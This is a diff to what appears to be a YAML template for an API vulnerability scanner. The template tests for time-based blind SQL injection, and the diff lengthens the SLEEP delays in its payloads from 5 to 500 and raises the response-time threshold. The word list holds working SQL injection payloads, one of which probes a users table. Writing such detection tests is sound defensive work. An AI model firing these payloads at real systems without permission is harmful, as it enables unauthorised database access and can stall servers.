@@ -76,10 +76,10 @@ api_selection_filters:
         extract: userVal
 wordLists:
   timeBasedPayloads:
-    - "' OR IF(1=1, SLEEP(5), 0) -- -"
+    - "' OR IF(1=1, SLEEP(500), 0) -- -"
     - "' OR IF(1=1, BENCHMARK(10000000, SHA1('test')), 0) -- -"
-    - "' OR IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0) -- -"
-    - "' OR (SELECT IF(1=1, SLEEP(5), 0)) -- -"
+    - "' OR IF((SELECT COUNT(*) FROM users) > 10, SLEEP(500), 0) -- -"
+    - "' OR (SELECT IF(1=1, SLEEP(500), 0)) -- -"
 execute:
   type: multiple
   requests:
@@ -136,7 +136,7 @@ validate:
   and:
     - compare_greater:
         - ${x2.response.stats.median_response_time}
-        - 5001
+        - 15001
     - compare_greater:
         - ${x2.response.stats.median_response_time}
         - ${x1.response.stats.median_response_time} * 5
